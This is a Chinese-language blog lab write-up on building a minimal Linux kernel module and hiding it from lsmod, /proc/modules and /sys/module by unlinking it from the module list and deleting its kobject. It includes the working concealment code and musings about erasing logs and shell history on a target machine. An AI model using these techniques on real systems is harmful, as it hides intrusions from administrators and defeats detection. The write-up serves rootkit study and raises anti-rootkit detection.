---
category: rootkit
title: Linux Rootkit 实验 | 0000 LKM 的基础编写&隐藏
---

# {{ page.title }}

## 实验说明

LKM 作为内核模块，动态加载，无需重新编译内核。

通过实验，学习 LKM 模块的编写和加载，以及如何初步隐藏模块。在本次实验中，隐藏意味着三个方面：

- 对 lsmod 隐藏
- 对 /proc/modules 隐藏
- 对 /sys/module 隐藏

## 实验环境

```
uname -a:
Linux kali 4.6.0-kali1-amd64 #1 SMP Debian 4.6.4-1kali1 (2016-07-21) x86_64 GNU/Linux

GCC version:6.1.1
```

上述环境搭建于虚拟机，另外在没有特殊说明的情况下，均以 root 权限执行。

**注：后面实验我参考的是4.10.10的源码，与FreeBuf上文章里的有些不同，但大体意思相同**

## 实验过程

我们首先看一下一般的 LKM 编译加载的过程。

**LKM 测试代码**

{% highlight c %}
// lkm.c
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>

static int lkm_init(void)
{
    printk("bt: module loaded\n");
    return 0;
}

static void lkm_exit(void)
{
    printk("bt: module removed\n");
}

module_init(lkm_init);
module_exit(lkm_exit);
{% endhighlight %}

**代码解释**

`lkm_init()`和`lkm_exit()`分别是内核模块的初始化函数和清除函数，角色类似于构造函数和析构函数，模块被加载时初始化函数被内核执行，模块被卸载时清除函数被执行。如果没有定义清除函数，则内核不允许卸载该模块。

内核中无法调用 C 库函数，所以不能用`printf`输出，要用内核导出的`printk`，它把内容记录到系统日志里。

`module_init`和`module_exit`是内核的两个宏，利用这两个宏来指定我们的初始化和清除函数。

**Makefile**

```
obj-m   := lkm.o
 
KDIR    := /lib/modules/$(shell uname -r)/build
PWD    := $(shell pwd)
 
default:
	$(MAKE) -C $(KDIR) SUBDIRS=$(PWD) modules
```

然后`make`就好。生成的`lkm.ko`文件就是模块文件。输入`insmod lkm.ko`加载模块。

接着通过`cat /var/log/messages`或`dmesg | tail -n 1`查看加载情况：

```
[ 2931.410443] bt: module loaded
```

对于这种正常模块来说，我们是可以查看到它的。输入`lsmod | grep lkm`：

```
lkm                    16384  0
```

而`lsmod`是通过`/proc/modules`获得信息的，我们也可以直接查看它。输入`cat /proc/modules | grep lkm`：

```
lkm 16384 0 - Live 0xffffffffc04a0000 (POE)
```

另外，还可以`ls /sys/module/`，我们会发现其下有一个`lkm/`目录，这也证明了我们的模块的存在。

好了，测试结束，卸载模块：`rmmod lkm.ko`。我们可以通过上面介绍的`dmesg`方式查看卸载的记录。

**隐藏模块**

下面我们开始隐藏实验。上面已经说过，`lsmod`是通过读取`/proc/modules`来发挥作用的，所以我们仅需要处理`/proc/modules`即可。另外，我们需要再处理掉`/sys/module/`下的模块子目录。

`/proc/modules`下的信息是内核利用`struct modules`结构体的表头去遍历内核模块链表，从所有模块的`struct module`结构体（这个结构体在内核中代表一个内核模块）中获得的。表头是一个全局变量`struct module *modules`。我们自己加载的新模块会被插入链表头部，所以可以通过`modules->next`引用。

我们在初始化函数中加入从链表中删除模块：

```
list_del_init(&__this_module.list);
```

在内核源码`include/linux/list.h`中可以找到它的相关定义：

{% highlight c %}
static inline void list_del_init(struct list_head *entry)
{
	__list_del_entry(entry);
	INIT_LIST_HEAD(entry);
}

static inline void __list_del_entry(struct list_head *entry)
{
	if (!__list_del_entry_valid(entry))
		return;

	__list_del(entry->prev, entry->next);
}

static inline void __list_del(struct list_head * prev, struct list_head * next)
{
	next->prev = prev;
	WRITE_ONCE(prev->next, next);
}

static inline void INIT_LIST_HEAD(struct list_head *list)
{
	WRITE_ONCE(list->next, list);
	list->prev = list;
}
{% endhighlight %}

最后的`INIT_LIST_HEAD`让模块自身的前后指针指向自身。

我们加入删除指令后重新编译，并插入，再测试一下（在插入前最好给虚拟机拍摄一个快照，一会儿内核模块无法通过`rmmod`卸载，要进行下面实验没有快照就只能重启了）：

![linux-rkt-0]({{ site.url }}/images/LinuxRootkits/linux-rkt-0.png)

没有了，但是在`/sys/module`下还是可以看到：

![linux-rkt-0]({{ site.url }}/images/LinuxRootkits/linux-rkt-1.png)

下面我们要让它在这里也消失，先恢复到加载模块之前的快照。

只需要在初始化函数中加入

{% highlight c %}
kobject_del(&THIS_MODULE->mkobj.kobj);
{% endhighlight %}

`THIS_MODULE`定义在`include/linux/export.h`中：

{% highlight c %}
extern struct module __this_module;
#define THIS_MODULE (&__this_module)
{% endhighlight %}

在`include/linux/module.h`中可以看到`module`结构体的成员`mkobj`：

{% highlight c %}
struct module_kobject mkobj;
{% endhighlight %}

`module_kobject`也在`include/linux/module.h`中：

{% highlight c %}
struct module_kobject {
	struct kobject kobj;
	struct module *mod;
	struct kobject *drivers_dir;
	struct module_param_attrs *mp;
	struct completion *kobj_completion;
};
{% endhighlight %}

`kobject`是组成设备模型的基本结构。`sysfs`是基于 RAM 的文件系统，它提供了用于向用户空间展示内核空间里对象、属性和链接的方法。`sysfs`和`kobject`层次紧密相连，将`kobject`层次关系展示出来，让用户层能够看到。一般`sysfs`挂载在`/sys/`，所以`/sys/module`就是`sysfs`的一个目录层次，包含当前加载的模块信息。所以，我们使用`kobject_del()`删除我们的模块的`kobject`，就可以达到隐藏的目的。

看一下`lib/kobject.c`的源码，很清楚：

{% highlight c %}
void kobject_del(struct kobject *kobj)
{
	struct kernfs_node *sd;

	if (!kobj)
		return;

	sd = kobj->sd;
	sysfs_remove_dir(kobj);
	sysfs_put(sd);

	kobj->state_in_sysfs = 0;
	kobj_kset_leave(kobj);
	kobject_put(kobj->parent);
	kobj->parent = NULL;
}
{% endhighlight %}

好了，编译并加载模块，测试一下：

![linux-rkt-0]({{ site.url }}/images/LinuxRootkits/linux-rkt-2.png)

Bingo!

## 实验问题

【问题一】

我们在本次实验中还是留下了痕迹，因为我们进行`insmod`和`rmmod`时会有输出，所以使用`dmesg`或者直接`cat /var/log/messages`还是可以看到。不过很简单，只需要取消输出即可，把`printk`去掉。

另外，执行命令的过程会被记录在`history`中，也许也应该清理一下？

【问题二】

测试模块的确看不到了，但也没办法通过命令行进行卸载。将来要找到卸载的方法，最好是易于控制的方法，或者能够自卸载（不知道可不可行）。进可攻，退可守，最好能够在需要撤离时不留痕迹地从目标机器上消失。

【问题三】

解释一下这个 Makefile 的内容？

【问题四】

`make`后生成的文件如下：

```
lkm.o
lkm.mod.c
lkm.mod.o
lkm.ko
modules.order
Module.symvers
```

`lkm.ko` 是我们需要的模块文件，那么其他的文件是干嘛的？

【问题五】

经过本次实验的操作，是否真的没有办法检测到这个模块了？那些 Anti-Rootkit 工具的原理又是什么？

## 实验总结与思考

　　本次实验是跟着 FreeBuf 上 arciryas 师傅的文章一步步操作的。这也是我借鉴“实验”的方法（做实验+写实验报告书）来整理学习相关零碎知识点并形成知识体系的第一次尝试。关于 Windows 上的 Rootkit 有一本《Rootkit:系统灰色地带的潜伏者》，最近张瑜先生出了一本《Rootkit隐遁攻击技术及其防范》。而 Linux Rootkit 的资料就比较零散了，多见于博客、论文和杂志（如 Phrack）中。它们往往是不成体系的，不断总结积累非常重要。初步想法是收集网络上的资料进行实验，再根据这些资料进行递归学习（如通过写拓展延伸积累基础知识），接着慢慢从整体的视角来把自己的实验成果进行整合，以此形成自己的知识技术网络。

　　可以感受到，`Rootkit`和`Linux kernel`是两个很大的主题。一方面，要进行正向的基础知识学习；另一方面，也可以通过自顶向下的方法，从目标慢慢延伸到原理。  
　　Just do it.

## 相关文章

- [Linux Rootkit 实验 0001 基于修改sys_call_table的系统调用挂钩](https://brant-ruan.github.io/sec/2017/05/08/LinuxRootkitExp-0001.html)

## 参考资料

- [Linux Rootkit系列一：LKM的基础编写及隐藏](http://www.freebuf.com/articles/system/54263.html)
